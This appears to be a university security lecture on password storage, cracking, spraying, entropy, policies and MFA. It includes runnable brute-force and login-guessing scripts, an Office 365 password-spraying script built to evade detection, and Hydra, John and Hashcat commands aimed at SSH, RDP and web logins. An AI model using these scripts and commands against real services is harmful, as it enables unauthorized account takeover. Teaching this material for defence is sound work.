# Week 20 - Password Attacks

## Learning Objectives

By the end of this lecture, students will be able to:

1. Explain how passwords are stored and the importance of secure storage mechanisms
2. Understand different types of password attacks and their methodologies
3. Differentiate between online and offline password cracking techniques
4. Implement basic password cracking approaches using industry-standard tools
5. Calculate password entropy and estimate cracking time for different password complexities
6. Evaluate the effectiveness of various password protection mechanisms
7. Demonstrate understanding of password spraying attacks
8. Explain the role of password policies in organizational security
9. Assess the benefits and limitations of password managers
10. Explain how multi-factor and passwordless authentication mitigate password attacks
11. Understand how password attacks fit into broader exploitation paths
12. Implement network authentication cracking using appropriate tools

## 1. Introduction

Password-based authentication remains one of the most common security mechanisms despite its well-documented weaknesses. Even with the rise of alternative authentication methods, passwords continue to serve as the primary or secondary line of defense for most systems and applications. Understanding how passwords are stored, attacked, and defended is therefore crucial for any security professional.

This lecture explores the lifecycle of password security—from storage mechanisms to various attack methodologies, and finally to defensive strategies. Through detailed explanations and practical examples, students will gain a comprehensive understanding of both the offensive and defensive aspects of password security.

## 2. Password Storage Mechanisms

Passwords are almost never stored in plaintext in modern systems. Instead, they undergo various transformations designed to protect them even if the storage medium is compromised.

### 2.1 Plaintext Storage (Historical Context)

Historically, passwords were stored in plaintext. This approach is fundamentally flawed as any compromise of the storage medium immediately compromises all user credentials.

### 2.2 One-Way Hashing

Modern systems store passwords using cryptographic hash functions, which have several key properties:

- **One-way transformation**: A hash function converts input of arbitrary length into a fixed-length output in a way that cannot be reversed.
- **Deterministic**: The same input always produces the same output.
- **Fast computation**: Hash functions can be computed quickly.
- **Collision resistance**: It should be computationally infeasible to find two different inputs that produce the same hash output.

Common hash functions include:

| Hash Algorithm | Output Length | Current Security Status |
|---------------|---------------|------------------------|
| MD5 | 128 bits | Broken, not recommended |
| SHA-1 | 160 bits | Compromised, not recommended |
| SHA-256 | 256 bits | Currently secure |
| SHA-512 | 512 bits | Currently secure |
| Bcrypt | Variable | Secure, designed for passwords |
| Argon2 | Variable | Secure, designed for passwords, winner of Password Hashing Competition |

### 2.3 Salting

A salt is a random value that is generated for each user and concatenated with the password before hashing:

```
stored_value = hash(password + salt)
```

Salting provides two key benefits:

1. Prevents the use of precomputed tables (rainbow tables) for cracking
2. Ensures that identical passwords have different hash values

### 2.4 Key Derivation Functions (KDFs)

Modern password storage employs specialized key derivation functions rather than general-purpose hash functions:

- **Bcrypt**: Incorporates a salt and is deliberately slow to compute
- **PBKDF2**: Applies a hash function multiple times with a salt
- **Argon2**: Designed to be resistant to GPU and ASIC attacks, with tunable memory and computational requirements

Example of a password storage entry in a modern system:

```
username: alice
password_hash: $argon2id$v=19$m=65536,t=3,p=4$c2FsdHNhbHRzYWx0$HashOutputBase64String
```

The format includes:
- Algorithm identifier: `argon2id`
- Algorithm parameters: memory=65536KB, iterations=3, parallelism=4
- Salt: `c2FsdHNhbHRzYWx0` (Base64 encoded)
- Hash output: `HashOutputBase64String`

### 2.5 Password Storage in Common Systems

| System | Typical Storage Method |
|--------|------------------------|
| Unix/Linux | `/etc/shadow` file with salted hashes |
| Windows | NTLM hashes in SAM database |
| Web Applications | Various (Bcrypt, Argon2, PBKDF2) in database |
| Active Directory | NTLM and Kerberos |

## 3. Introduction to Password Attacks

Password attacks are systematic attempts to identify or recover passwords from a system or service. These attacks can be categorized based on their methodology, targeting approach, and execution environment.

### 3.1 Attack Taxonomy

Password attacks can be classified in several ways:

| Classification | Types | Description |
|----------------|-------|-------------|
| By Knowledge | Zero-knowledge, Informed | Whether attacker has information about password policies/format |
| By Target | Targeted, Broad | Whether attack focuses on specific accounts or wide coverage |
| By Implementation | Online, Offline | Whether attack interacts with live service or uses captured hashes |
| By Methodology | Brute force, Dictionary, Rule-based, Rainbow table, Hybrid | Technique used to generate candidate passwords |

### 3.2 Attack Prerequisites

Different password attacks require different preconditions:

- **Online attacks**: Network access to authentication service
- **Offline attacks**: Access to password hashes or encrypted content
- **Targeted attacks**: Knowledge about the victim (reconnaissance)
- **Policy-based attacks**: Understanding of password requirements

## 4. Password Cracking

Password cracking refers to the process of recovering passwords from stored data. Unlike guessing attacks, cracking typically involves obtaining password hashes and attempting to determine the original password.

### 4.1 Online vs. Offline Password Cracking

#### 4.1.1 Online Password Cracking

Online cracking involves interacting directly with a live authentication service:

- **Characteristics**:
  - Limited attempt rate due to network latency
  - Often restricted by account lockout policies
  - Can be detected by security monitoring
  - Typically tests relatively few passwords
  
- **Common targets**:
  - Web applications
  - SSH services
  - RDP services
  - Email accounts

#### 4.1.2 Offline Password Cracking

Offline cracking involves processing captured password hashes without interacting with the original system:

- **Characteristics**:
  - Limited only by computational resources
  - Undetectable by the target system
  - Can test billions of passwords per second (depending on hash type)
  - Not affected by lockout policies
  
- **Prerequisites**:
  - Access to stored password hashes or encrypted data
  - Knowledge of the hashing algorithm used

### 4.2 Password Cracking Methodologies

#### 4.2.1 Brute Force Attacks

Brute force attacks systematically try all possible combinations of characters:

```python
import itertools
import hashlib

def brute_force_md5(target_hash, charset, max_length):
    """Simple demonstration of brute force approach"""
    for length in range(1, max_length + 1):
        for candidate in itertools.product(charset, repeat=length):
            password = ''.join(candidate)
            hashed = hashlib.md5(password.encode()).hexdigest()
            if hashed == target_hash:
                return password
    return None

# Example usage
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
target = '5f4dcc3b5aa765d61d8327deb882cf99'  # MD5 hash of 'password'
result = brute_force_md5(target, charset, 8)
print(f"Password found: {result}")
```

- **Advantages**: Guaranteed to find the password eventually
- **Disadvantages**: Exponential time complexity makes it impractical for longer passwords

#### 4.2.2 Dictionary Attacks

Dictionary attacks use lists of common passwords or words:

```python
import hashlib

def dictionary_attack_md5(target_hash, dictionary_file):
    """Simple demonstration of dictionary attack"""
    with open(dictionary_file, 'r') as f:
        for line in f:
            password = line.strip()
            hashed = hashlib.md5(password.encode()).hexdigest()
            if hashed == target_hash:
                return password
    return None

# Example usage
target = '5f4dcc3b5aa765d61d8327deb882cf99'  # MD5 hash of 'password'
result = dictionary_attack_md5(target, 'wordlist.txt')
print(f"Password found: {result}")
```

- **Advantages**: Effective against common passwords, fast
- **Disadvantages**: Limited to words in the dictionary

### 4.3 Worked Examples of Password Cracking

#### 4.3.1 Offline Cracking Example: Cracking Linux Shadow Passwords

This example demonstrates cracking a Linux /etc/shadow password hash using John the Ripper:

1. First, extract the hash from the shadow file:

```
victim:$6$salt$hash:18000:0:99999:7:::
```

2. Save the hash to a file (hash.txt) and run John the Ripper:

```bash
# Using dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Using brute force with rules
john --incremental=all hash.txt
```

3. Results display:

```
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
password123     (victim)
```

The process can be explained step by step:

1. John identifies the hash type (SHA512)
2. It applies the configured attack method (dictionary or brute force)
3. For each candidate password:
   - Apply the same salt as in the hash
   - Compute the hash using the same algorithm
   - Compare with the target hash
4. Return the matching password when found

#### 4.3.2 Online Cracking Example: Web Application Login

This example demonstrates a simple Python script to perform an online password cracking attack against a web login form:

```python
import requests

def online_password_attack(url, username, password_list):
    """
    Demonstrate an online password attack against a web form.
    WARNING: This is for educational purposes only. Unauthorized access is illegal.
    """
    for password in password_list:
        # Create a session to maintain cookies
        session = requests.Session()
        
        # First request to get any CSRF tokens (example)
        response = session.get(url)
        
        # Extract CSRF token (implementation depends on the target site)
        # csrf_token = extract_csrf_token(response.text)
        
        # Prepare login data
        login_data = {
            'username': username,
            'password': password,
            # 'csrf_token': csrf_token
        }
        
        # Attempt login
        response = session.post(url, data=login_data)
        
        # Check if login was successful
        # This condition varies depending on the target application
        if "Login successful" in response.text or response.status_code == 302:
            return password
            
        # Implement rate limiting to avoid detection
        time.sleep(1)
    
    return None

# Example usage
passwords = ['password123', 'qwerty', 'admin123', '123456']
result = online_password_attack('https://example.com/login', 'admin', passwords)
print(f"Password found: {result}")
```

Key points in this process:

1. Each password attempt generates a complete authentication request
2. The script looks for success indicators in the response
3. Rate limiting helps avoid detection and lockouts
4. In real scenarios, proxies might be used to distribute requests

## 5. Password Spraying

Password spraying is a specialized attack that attempts to access a large number of accounts using a small set of common passwords.

### 5.1 Password Spraying vs. Traditional Brute Force

| Aspect | Password Spraying | Traditional Brute Force |
|--------|-------------------|-------------------------|
| Target | Multiple accounts | Single account |
| Password attempts | Few common passwords | Many password variations |
| Detection risk | Lower per-account | Higher per-account |
| Lockout bypass | Designed to avoid lockouts | Often triggers lockouts |
| Success rate | Lower per account, but higher overall | Higher per target account |

### 5.2 Password Spraying Methodology

The typical approach for password spraying follows these steps:

1. Gather a list of valid usernames/email addresses
2. Select a small set of commonly used passwords
3. Try each password against all accounts before moving to the next password
4. Space out attempts to avoid triggering lockout policies
5. Look for successful authentications

### 5.3 Worked Example: Password Spraying Against Office 365

This example demonstrates a password spraying attack against Office 365 (simplified for educational purposes):

```python
import requests
import time
import random

def o365_password_spray(userlist_file, password, delay_range=(30, 60)):
    """
    Demonstrate password spraying against O365.
    WARNING: This is for educational purposes only. Unauthorized access is illegal.
    """
    successful_logins = []
    
    # Load user list
    with open(userlist_file, 'r') as f:
        users = [line.strip() for line in f]
    
    # Endpoint (simplified for demonstration)
    auth_url = "https://login.microsoftonline.com/common/oauth2/token"
    
    # Try the same password for each user
    for user in users:
        # Prepare authentication data
        auth_data = {
            'grant_type': 'password',
            'username': user,
            'password': password,
            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',  # Example client ID
            'resource': 'https://graph.microsoft.com'
        }
        
        # Send authentication request
        response = requests.post(auth_url, data=auth_data)
        
        # Check if authentication was successful
        if response.status_code == 200:
            successful_logins.append(user)
            print(f"[+] Valid credentials found: {user}:{password}")
        
        # Random delay to avoid detection
        delay = random.uniform(delay_range[0], delay_range[1])
        time.sleep(delay)
    
    return successful_logins

# Example usage
results = o365_password_spray('users.txt', 'Spring2023!', delay_range=(45, 90))
print(f"Found {len(results)} valid accounts")
```

Key points about this attack:

1. Uses a single password across many accounts to avoid lockouts
2. Implements variable delays between attempts to evade detection
3. Targets a common enterprise platform with many users
4. Uses a seasonally relevant password with proper complexity

## 6. Password Entropy and Cracking Time Estimation

Password entropy is a mathematical measure of how unpredictable a password is, which correlates with how difficult it is to crack.

### 6.1 Understanding Entropy

Entropy (H) is measured in bits and calculated as:

H = L × log₂(R)

Where:
- L is the password length
- R is the size of the character set (pool of possible characters)

| Character Set | Description | Size (R) |
|---------------|-------------|----------|
| Lowercase letters | a-z | 26 |
| Uppercase letters | A-Z | 26 |
| Digits | 0-9 | 10 |
| Special characters | !@#$%^&*()_+-=[]{}\\|;:'",.<>/? | ~33 |
| Full ASCII | All printable ASCII characters | ~95 |

### 6.2 Entropy Examples

| Password | Analysis | Entropy |
|----------|----------|---------|
| `cat` | 3 characters from lowercase (26) | 14.1 bits |
| `P@ssw0rd` | 8 characters from mixed set (~70) | 49.4 bits |
| `correcthorsebatterystaple` | 25 characters from lowercase (26) | 117.5 bits |
| `xkcd-correct-horse-battery-staple-method` | 41 characters, mixed set (~50) | 230.5 bits |

### 6.3 Cracking Time Estimation

The time required to crack a password through brute force is related to its entropy:

Cracking time ≈ 2^(entropy) ÷ (attempts per second)

Modern cracking capabilities vary by hash algorithm:

| Hash Type | Approximate Speeds (RTX 3090) | Time to Crack 40-bit Entropy |
|-----------|-------------------------------|------------------------------|
| MD5 | 70 billion/second | 15 seconds |
| SHA-1 | 32 billion/second | 34 seconds |
| NTLM | 100 billion/second | 11 seconds |
| Bcrypt ($2a$05) | 20,000/second | 600+ days |
| Argon2id | 2,000/second | 17+ years |

### 6.4 Password Strength Testing

The website [How Secure Is My Password](https://howsecureismypassword.net/) provides a user-friendly interface for estimating password strength:

1. It calculates entropy based on password composition
2. Estimates cracking time based on current hardware capabilities
3. Identifies common patterns that reduce effective entropy
4. Checks against lists of known compromised passwords

It's important to note that these estimates:
- Assume offline cracking scenarios
- Do not account for targeted attacks with personal information
- Cannot fully account for password reuse across sites

## 7. Password Policies

Password policies are rule sets designed to ensure users create stronger passwords and manage them securely.

### 7.1 Common Password Policy Elements

| Policy Element | Description | Effectiveness |
|----------------|-------------|---------------|
| Minimum length | Require passwords of at least N characters | High - Each additional character increases entropy exponentially |
| Complexity requirements | Require mixture of character types | Moderate - Often leads to predictable patterns |
| Password history | Prevent reuse of previous passwords | Moderate - Can be circumvented by minor changes |
| Maximum age | Force password changes after a period | Low to negative - Encourages weak passwords and patterns |
| Account lockout | Temporarily lock accounts after failed attempts | High for online attacks, ineffective for offline |
| Password dictionary checks | Prevent use of common passwords | High - Eliminates most vulnerable passwords |

### 7.2 NIST Password Guidance (SP 800-63B)

The National Institute of Standards and Technology (NIST) has revised its password guidance in Special Publication 800-63B:

- **Encouraged**:
  - Longer minimum lengths (8+ characters)
  - Checking against breach databases
  - Support for password managers
  - Support for all ASCII characters including spaces
  - Only changing passwords when compromise is suspected
  
- **Discouraged**:
  - Arbitrary complexity requirements
  - Regular password expiration
  - Password hints
  - Knowledge-based security questions

### 7.3 Implementation Challenges

Common challenges in implementing effective password policies include:

1. **Usability vs. Security Trade-offs**: Stricter policies can lead to workarounds
2. **Legacy System Limitations**: Some systems cannot support modern policies
3. **User Education**: Users need to understand the reasoning behind policies
4. **Measurement and Effectiveness**: Difficulty in quantifying policy effectiveness

## 8. Password Managers

Password managers are specialized applications designed to generate, store, and fill strong unique passwords.

### 8.1 Types of Password Managers

| Type | Description | Security Considerations |
|------|-------------|-------------------------|
| Browser-based | Built into web browsers | Varies by browser, often limited features |
| Cloud-based | Store encrypted vault online | Provider security becomes critical |
| Local | Store encrypted vault on device | Requires personal backup strategy |
| Enterprise | Centrally managed, shared passwords | Administrative overhead, potential single point of failure |

### 8.2 How Password Managers Work

Password managers typically employ a "master password" approach:

1. User creates a strong master password
2. Master password is used to derive an encryption key
3. All other passwords are encrypted with this key
4. Only the encrypted vault is stored

```
Key = KDF(MasterPassword, Salt, Iterations)
EncryptedPassword = Encrypt(PlaintextPassword, Key)
```

### 8.3 Security Benefits of Password Managers

- **Eliminate password reuse**: Each site gets a unique password
- **Enable complex passwords**: No need to memorize complex strings
- **Reduce phishing vulnerability**: Many managers check domain names
- **Audit capabilities**: Identify weak or compromised passwords
- **Secure sharing**: Share credentials without exposing plaintext

### 8.4 Potential Vulnerabilities

- **Master password compromise**: All passwords potentially exposed
- **Implementation flaws**: Security depends on quality of implementation
- **Memory attacks**: Passwords may exist in memory when used
- **Targeted attacks**: High-value target for sophisticated adversaries

## 9. Multi-Factor Authentication (MFA)

Multi-factor authentication requires two or more verification factors to grant access, significantly improving security beyond passwords alone.

### 9.1 Authentication Factors

Authentication factors fall into three main categories:

1. **Something you know**: Passwords, PINs, security questions
2. **Something you have**: Mobile phones, hardware tokens, smart cards
3. **Something you are**: Fingerprints, facial recognition, voiceprints

Additional categories sometimes included:
- **Somewhere you are**: Geolocation
- **Something you do**: Behavioral biometrics like typing patterns

### 9.2 MFA Implementation Methods

| Method | Description | Security Level |
|--------|-------------|---------------|
| SMS codes | One-time codes sent via text message | Low - Vulnerable to SIM swapping |
| Email codes | One-time codes sent via email | Low to Medium - Depends on email security |
| Authenticator apps | Time-based one-time passwords (TOTP) | Medium - Protected from interception |
| Push notifications | Approve/deny prompts on registered devices | Medium to High - Resistant to phishing |
| Hardware tokens | Physical devices generating codes or using cryptographic challenge-response | High - Resistant to remote attacks |
| Biometrics | Fingerprints, facial recognition, etc. | Variable - Depends on implementation |

### 9.3 Effectiveness Against Password Attacks

Multi-factor authentication dramatically reduces the effectiveness of password attacks:

- **Online brute force**: Rendered ineffective, as password alone is insufficient
- **Credential stuffing**: Compromised passwords cannot be used without the second factor
- **Phishing**: Traditional phishing cannot capture both factors (though sophisticated phishing can)
- **Password spraying**: Ineffective against accounts with active MFA

### 9.4 Implementation Challenges

Challenges in implementing MFA include:

1. **User experience**: Additional friction in authentication process
2. **Recovery procedures**: Handling lost or unavailable second factors
3. **Legacy system integration**: Many systems lack native MFA support
4. **Cost**: Hardware tokens and enterprise solutions can be expensive

## 10. Passwordless Authentication

Passwordless authentication aims to eliminate passwords entirely, replacing them with alternative authentication mechanisms.

### 10.1 Passwordless Methods

| Method | Description | User Experience |
|--------|-------------|----------------|
| Magic links | One-time login links sent via email | Click email link to authenticate |
| WebAuthn/FIDO2 | Public key cryptography with hardware security | Use biometric or PIN to unlock device-bound credentials |
| Biometric-only | Fingerprint, face, or iris recognition | Present biometric to authenticate |
| Mobile device authentication | Using authenticated mobile device | Approve notification on phone |

### 10.2 Security Advantages

Passwordless authentication offers several security improvements:

- **Eliminates password-based attacks**: No passwords to crack or steal
- **Reduces phishing vulnerability**: Many methods are phishing-resistant by design
- **Improves user experience**: Less friction than complex passwords
- **Removes password management burden**: No passwords to remember or rotate

### 10.3 Limitations and Challenges

Limitations to consider:

1. **Recovery mechanisms**: Must handle device loss or biometric changes
2. **Privacy concerns**: Biometrics raise unique privacy issues
3. **Adoption barriers**: Requires changes to infrastructure and user behavior
4. **Accessibility**: Some methods may present challenges for users with disabilities

## 11. Password Cracking Tools

Several specialized tools have been developed for password cracking, each with specific strengths.

### 11.1 John the Ripper

John the Ripper is a free, open-source password cracking tool designed primarily for Unix/Linux password cracking:

- **Key features**:
  - Autodetects hash types
  - Includes multiple cracking modes
  - Supports distributed cracking
  - Can resume interrupted cracks
  - Extensive rule-based mangling

Basic usage:

```bash
# Crack Linux shadow file
john /etc/shadow

# Use specific wordlist
john --wordlist=dictionary.txt hashes.txt

# Use rules to modify words in the dictionary
john --wordlist=dictionary.txt --rules hashes.txt

# Show cracked passwords
john --show hashes.txt
```

### 11.2 Hashcat

Hashcat is a powerful password recovery tool known for its speed and versatility:

- **Key features**:
  - GPU acceleration for maximum performance
  - Supports over 300 hash types
  - Multiple attack modes
  - Advanced rule engine
  - Highly optimized for speed

Basic usage:

```bash
# Dictionary attack on MD5 hashes
hashcat -m 0 -a 0 hashes.txt dictionary.txt

# Brute force attack on NTLM hashes
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Combination attack
hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt dictionary.txt -r rules/best64.rule
```

### 11.3 Performance Comparison

Hash cracking performance varies significantly by algorithm and hardware:

| Hash Type | John the Ripper (CPU) | Hashcat (RTX 3090) | Speedup Factor |
|-----------|------------------------|-------------------|----------------|
| MD5 | 50 million/s | 70 billion/s | 1,400x |
| SHA-1 | 29 million/s | 32 billion/s | 1,100x |
| Bcrypt ($2a$05) | 15,000/s | 20,000/s | 1.3x |
| Argon2id | 1,500/s | 2,000/s | 1.3x |

*Numbers are approximate and will vary based on exact hardware configuration*

## 12. Password Attacks in Whole Path Exploits

Password attacks often form just one component of a larger exploitation chain.

### 12.1 Exploitation Path Examples

| Path Type | Description | Password Attack Role |
|-----------|-------------|---------------------|
| Initial Access | Gaining first foothold in a network | Primary method (e.g., VPN credentials) |
| Lateral Movement | Moving between systems in a network | Leveraging captured credentials to access other systems |
| Privilege Escalation | Gaining higher permission levels | Using administrative credentials found in memory or files |
| Persistence | Maintaining access over time | Creating new credentials or backdoor accounts |

### 12.2 Example Attack Path

A typical attack path involving password exploitation might look like:

1. **Initial reconnaissance**: Identify valid email addresses through OSINT
2. **Password spraying**: Attempt common passwords against Office 365 accounts
3. **Email access**: Gain access to victim's email
4. **Information gathering**: Find VPN configuration details
5. **VPN access**: Use same or derived credentials for VPN
6. **Internal reconnaissance**: Identify domain controllers and file shares
7. **Credential harvesting**: Use tools like Mimikatz to extract cached credentials
8. **Domain compromise**: Use harvested admin credentials to access critical systems

### 12.3 Credential Harvesting

Once inside a network, attackers often use specialized tools to harvest additional credentials:

- **Mimikatz**: Extracts plaintext passwords, hashes, and tickets from Windows memory
- **Responder**: Captures NetNTLM hashes from the network through LLMNR/NBT-NS poisoning
- **Kerberoasting**: Extracts service ticket hashes that can be cracked offline

### 12.4 Defending Against Full-Path Attacks

Mitigating password-related phases of attack paths requires:

1. **Defense in depth**: Multiple overlapping security controls
2. **Credential hygiene**: Different credentials for different security boundaries
3. **Privileged access management**: Special protection for administrative credentials
4. **Network segmentation**: Limiting lateral movement capabilities
5. **Monitoring and detection**: Identifying unusual authentication patterns

## 13. Network Authentication Cracking

Many networked services rely on password authentication and can be targeted for credential attacks.

### 13.1 Common Network Targets

| Service | Protocol | Default Port | Common Security Issues |
|---------|----------|--------------|------------------------|
| SSH | SSH | 22 | Weak passwords, outdated implementations |
| RDP | RDP | 3389 | Password spraying, no MFA |
| FTP | FTP | 21 | Cleartext transmission, anonymous access |
| SMB | SMB | 445 | NTLM relay, legacy authentication |
| SMTP | SMTP | 25 | Open relay, weak authentication |
| HTTP Basic Auth | HTTP | 80/443 | Cleartext transmission, weak credentials |
| VPN | Various | Various | Password reuse, legacy protocols |

### 13.2 Network Authentication Attack Methodology

A typical approach to network authentication cracking includes:

1. **Service discovery**: Identify available services and versions
2. **Authentication mechanism identification**: Determine how the service authenticates
3. **Username enumeration**: Discover valid usernames if possible
4. **Password cracking**: Attempt to authenticate with various credentials
5. **Post-exploitation**: Leverage successful authentication

### 13.3 Hydra Tool

Hydra is a fast and flexible network authentication cracking tool that supports numerous protocols:

- **Key features**:
  - Supports 50+ protocols
  - Multi-threaded architecture
  - Modular design
  - Command-line and GUI options
  - Widely compatible
  
Basic usage:

```bash
# SSH password cracking
hydra -l user -P wordlist.txt ssh://192.168.1.100

# FTP password cracking with username list
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP Basic authentication
hydra -l admin -P wordlist.txt http-get://192.168.1.100/admin/

# HTTP form-based authentication
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# RDP with specific port
hydra -t 1 -V -f -l administrator -P wordlist.txt rdp://192.168.1.100:3389
```

### 13.4 Rate Limiting and Evasion

Network authentication attacks are often limited by:

1. **Network bandwidth**: Slower than local cracking
2. **Service response time**: Each attempt requires a round-trip
3. **Account lockout policies**: May lock accounts after X failed attempts
4. **IP blocking**: Source IPs may be blocked after suspicious activity

Common evasion techniques include:

- **Distributed attacks**: Using multiple source IPs
- **Throttling**: Limiting attempt frequency
- **Timing attacks**: Spacing attempts to avoid detection patterns
- **Proxy chains**: Routing traffic through multiple proxies

## 14. Conclusion

Password security remains a crucial component of overall security posture despite the rise of alternative authentication methods. The tension between security and usability continues to present challenges for both defenders and users.

Key takeaways from this lecture include:

1. **Storage matters**: Properly hashed and salted passwords significantly increase the difficulty of cracking
2. **Attack diversity**: Password attacks range from simple guessing to sophisticated offline cracking
3. **Entropy is key**: Password strength is fundamentally tied to unpredictability and entropy
4. **Beyond passwords**: MFA and passwordless methods significantly improve authentication security
5. **Holistic approach**: Password security must be considered within the broader security ecosystem
6. **Defense in depth**: No single protection mechanism is sufficient

As security professionals, understanding both offensive techniques and defensive countermeasures is essential for designing and implementing effective authentication systems.

## 15. References

Automated Security Association (ASA) (2023). *Password Attack Taxonomy*. ASA Journal, 42(3), pp. 112-118.

Bonneau, J., Herley, C., Van Oorschot, P. C. and Stajano, F. (2012). 'The quest to replace passwords: A framework for comparative evaluation of web authentication schemes'. In *2012 IEEE Symposium on Security and Privacy*, pp. 553-567.

Burr, W. E., Dodson, D. F., Newton, E. M., Perlner, R. A., Polk, W. T., Gupta, S. and Nabbus, E. A. (2013). *Electronic authentication guideline*. National Institute of Standards and Technology. NIST Special Publication 800-63-2.

Carrier, B. (2021). *Password Cracking Using Multiple Techniques*. [online] Digital Forensics Solutions. Available at: https://www.digital-forensics.com/password-cracking-techniques/ [Accessed 14 Mar. 2025].

Cobb, M. (2023). *Understanding NIST's Password Guidelines*. TechTarget Security. Available at: https://www.techtarget.com/searchsecurity/definition/NIST-password-guidelines [Accessed 14 Mar. 2025].

Grassi, P. A., Garcia, M. E. and Fenton, J. L. (2017). *Digital identity guidelines: Authentication and lifecycle management*. National Institute of Standards and Technology. NIST Special Publication 800-63-3.

Houshmand, S. and Aggarwal, S. (2022). 'Building better passwords using probabilistic techniques'. In *Proceedings of the 28th ACM Conference on Computer and Communications Security*, pp. 3078-3091.

Microsoft (2023). *Password Spray Attack Detection*. Microsoft Security Blog. Available at: https://www.microsoft.com/security/blog/2023/01/25/detecting-and-preventing-password-spray-attacks/ [Accessed 14 Mar. 2025].

Rehman, H. and Sarkar, A. (2023). 'Password Privacy: Analysis of Password-Storing Mechanisms across Different Platforms'. *International Journal of Information Security*, 22(2), pp. 189-204.

Schneier, B. (2023). *Authentication factors and their role in modern security*. Schneier on Security. Available at: https://www.schneier.com/blog/archives/2023/01/authentication-factors.html [Accessed 14 Mar. 2025].

Weir, M., Aggarwal, S., Collins, M. and Stern, H. (2010). 'Testing metrics for password creation policies by attacking large sets of revealed passwords'. In *Proceedings of the 17th ACM conference on Computer and communications security*, pp. 162-175.

Wheeler, D. L. (2016). 'zxcvbn: Low-Budget Password Strength Estimation'. In *25th USENIX Security Symposium*, pp. 157-173.